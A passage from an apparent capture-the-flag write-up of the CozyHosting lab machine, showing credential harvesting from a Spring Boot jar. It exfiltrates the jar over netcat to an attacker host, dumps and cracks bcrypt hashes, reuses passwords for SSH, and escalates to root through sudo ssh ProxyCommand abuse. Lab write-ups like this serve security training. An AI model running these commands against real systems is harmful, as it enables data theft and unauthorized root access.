        listen 80;
        return 301 http://cozyhosting.htb;
}
server {
        listen 80;
        server_name cozyhosting.htb;
        location / {
                proxy_pass http://localhost:8080;
        }
}

```

#### Home Directories

There is one user with a home directory, but app cannot access it:

```
app@cozyhosting:/home$ ls
josh
app@cozyhosting:/home$ cd josh/
bash: cd: josh/: Permission denied

```

There’s not much else interesting that app can access.

### cloudhosting-0.0.1.jar

#### Strategy

I’m going to take a look at the web application, and there are a couple of approaches that both get to the same information I need to move forward:

```
flowchart TD;
    A[cloudhosting-0.0.1.jar]-->B(Unzip on CozyHosting);
    A-->C(Exfil and jd-gui);
    B-->D[Find DB Credentials];
    C-->D;
linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;

```

#### Unzip on CozyHosting

Jar files are Java Archive files. They contain all the files needed to run the Java application (in this case a web server), and are actually just Zip file. The quick and dirty way to take a copy of it and just unzip it to take an initial look:

```
app@cozyhosting:/app$ cp cloudhosting-0.0.1.jar /dev/shm/
app@cozyhosting:/app$ cd /dev/shm/
app@cozyhosting:/dev/shm$ unzip cloudhosting-0.0.1.jar
Archive:  cloudhosting-0.0.1.jar
   creating: META-INF/
  inflating: META-INF/MANIFEST.MF
   creating: org/
...[snip]...

```

The entry point for the application is defined in the `MANIFEST.MF` file as `htb.cloudhosting.CozyHostingApp`:

```
app@cozyhosting:/dev/shm$ cat META-INF/MANIFEST.MF
Manifest-Version: 1.0
Created-By: Maven JAR Plugin 3.3.0
Build-Jdk-Spec: 17
Implementation-Title: cloudhosting
Implementation-Version: 0.0.1
Main-Class: org.springframework.boot.loader.JarLauncher
Start-Class: htb.cloudhosting.CozyHostingApp
Spring-Boot-Version: 3.0.2
Spring-Boot-Classes: BOOT-INF/classes/
Spring-Boot-Lib: BOOT-INF/lib/
Spring-Boot-Classpath-Index: BOOT-INF/classpath.idx
Spring-Boot-Layers-Index: BOOT-INF/layers.idx

```

But I’ll save the code analysis for a nicer application. Having all these files allows me to do things like looks for passwords:

```
app@cozyhosting:/dev/shm$ grep -r password . 2>/dev/null
./BOOT-INF/classes/application.properties:spring.datasource.password=Vg&nvzAQ7XxR
./BOOT-INF/classes/templates/login.html:                                        <input type="password" name="password" class="form-control" id="yourPassword"
./BOOT-INF/classes/templates/login.html:                                        <div class="invalid-feedback">Please enter your password!</div>
./BOOT-INF/classes/templates/login.html:                                    <p th:if="${param.error}" class="text-center small">Invalid username or password</p>
./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.symbol.svg:</symbol><symbol viewBox="0 0 24 24" id="ri-lock-password-fill">
./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.symbol.svg:</symbol><symbol viewBox="0 0 24 24" id="ri-lock-password-line">
./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.svg:    <glyph glyph-name="lock-password-fill"
./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.svg:    <glyph glyph-name="lock-password-line"
./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.less:.ri-lock-password-fill:before { content: "\eecf"; }
./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.less:.ri-lock-password-line:before { content: "\eed0"; }
./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.css:.ri-lock-password-fill:before { content: "\eecf"; }
./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.css:.ri-lock-password-line:before { content: "\eed0"; }

```

The first line has a `datasource` password, which looks interesting. I’ll inspect that file:

```
app@cozyhosting:/dev/shm$ cat BOOT-INF/classes/application.properties
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres

```

It’s the database connection information.

#### jd-gui

I’ll start `nc` listening forwarding any output to `cloudhosting-0.0.1.jar` on my host:

```
oxdf@hacky$ nc -lnvp 443 > cloudhosting-0.0.1.jar
Listening on 0.0.0.0 443

```

On CozyHosting, I’ll send the Jar into `nc` back to my host:

```
app@cozyhosting:/dev/shm$ cat cloudhosting-0.0.1.jar | nc 10.10.14.6 443

```

This hangs, but on my host it shows a connection:

```
oxdf@hacky$ nc -lnvp 443 > cloudhosting-0.0.1.jar
Listening on 0.0.0.0 443
Connection received on 10.10.11.230 48534

```

After a few seconds, I’ll kill it on my side, and make sure the `md5sum` of the two files matches.

I’ll I’ll download the [jd-gui](https://java-decompiler.github.io/) Jar file and run it with `java -jar jd-gui-1.6.6.jar`, opening the Jar file. The `htb.cloudhosting.CozyHostingApp` class just starts the Spring Boot application:

![image-20240227124935411](https://0xdf.gitlab.io/img/image-20240227124935411.png)

The `application.properties` file is right there as well, with the DB info:

![image-20240227125049373](https://0xdf.gitlab.io/img/image-20240227125049373.png)

### Database

I’ll connect to Postgres using the `psql` utility installed on CozyHosting:

```
app@cozyhosting:/$ PGPASSWORD='Vg&nvzAQ7XxR' psql -U postgres -h localhost
psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=#

```

There is really one interesting database:

```
postgres=# \list
                                   List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges
-------------+----------+----------+-------------+-------------+-----------------------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
(4 rows)

```

It has two tables, `hosts` and `users`:

```
cozyhosting=# \dt
         List of relations
 Schema | Name  | Type  |  Owner
--------+-------+-------+----------
 public | hosts | table | postgres
 public | users | table | postgres
(2 rows)

```

The `hosts` table isn’t interesting, but the `users` table has hashes in it:

```
cozyhosting=# select * from users;
   name    |                           password                           | role
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)

```

### Crack Hash

I’ll make a `hashes` file with those two hashes:

```
$ cat hashes
kanderson:$2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim
admin:$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm

```

`hashcat` isn’t able to automatically detect the hash type:

```
$ hashcat hashes --user /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v6.2.6) starting
...[snip]...
The following 4 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce

Please specify the hash-mode with -m [hash-mode].
...[snip]...

```

I’m including `--user` because my hashes have `[username]:` at the front of each line.

3200 is the most generic type, so I’ll start with that:

```
$ hashcat hashes --user -m 3200 /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v6.2.6) starting
...[snip]...
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
...[snip]...

```

admin’s password is “manchesterunited”.

### su / SSH

The other user on the box is josh, and that password works with `su`:

```
app@cozyhosting:/$ su - josh
Password:
josh@cozyhosting:~$

```

Or I can get a clean shell with SSH:

```
oxdf@hacky$ sshpass -p manchesterunited ssh josh@cozyhosting.htb
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-82-generic x86_64)
...[snip]..
josh@cozyhosting:~$

```

Either way, I can grab `user.txt`:

```
josh@cozyhosting:~$ cat user.txt
30628c91************************

```

## Shell as root

### Enumeration

The josh user can run `ssh` as root using `sudo`:

```
josh@cozyhosting:~$ sudo -l
[sudo] password for josh:
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *

```

### Execution

There’s a GTFObins page for `ssh`, but it’s more fun to look at the [man page](https://man.openbsd.org/ssh_config#ProxyCommand). SSH has an option called `ProxyCommand`. I actually use this in real life to connect to SSH servers through a socks proxy. I have an SSH config file that looks like this:

![image-20240227131623646](https://0xdf.gitlab.io/img/image-20240227131623646.png)

When I run `ssh [hostname]`, it runs `nc` connecting to `localhost:1080` as a SOCKS5 ( `-X 5`) proxy, and then my SSH connection can travel over that proxy.

The `ProxyCommand` is run on the client before making the connection, so I can abuse that to do arbitrary things as the user who is running the `ssh` command. In this case, that’s root because of `sudo`. I’ll show touching a file:

```
josh@cozyhosting:~$ sudo ssh -o ProxyCommand='touch /tmp/0xdf' x
kex_exchange_identification: Connection closed by remote host
Connection closed by UNKNOWN port 65535
josh@cozyhosting:~$ ls -l /tmp/0xdf
-rw-r--r-- 1 root root 0 Feb 27 18:19 /tmp/0xdf

```

It works. I can use this to make a SetUID `bash`:

```
josh@cozyhosting:~$ sudo ssh -o ProxyCommand='cp /bin/bash /tmp/0xdf' localhost
kex_exchange_identification: Connection closed by remote host
Connection closed by UNKNOWN port 65535
josh@cozyhosting:~$ sudo ssh -o ProxyCommand='chmod 6777 /tmp/0xdf' localhost
kex_exchange_identification: Connection closed by remote host
Connection closed by UNKNOWN port 65535
josh@cozyhosting:~$ ls -l /tmp/0xdf
-rwsrwsrwx 1 root root 1396520 Feb 27 18:20 /tmp/0xdf

```

Now running it (with `-p` to not drop privs) gives a root shell:

```
josh@cozyhosting:~$ /tmp/0xdf -p
0xdf-5.1# id
uid=1003(josh) gid=1003(josh) euid=0(root) egid=0(root) groups=0(root),1003(josh)

```

GTFObins gives a shorter path, using redirection to get the shell immediately from the `ssh` process:

```
josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# id
uid=0(root) gid=0(root) groups=0(root)

```

Either way, I can grab the flag:

```
0xdf-5.1# cat /root/root.txt
01ebd55a************************

```





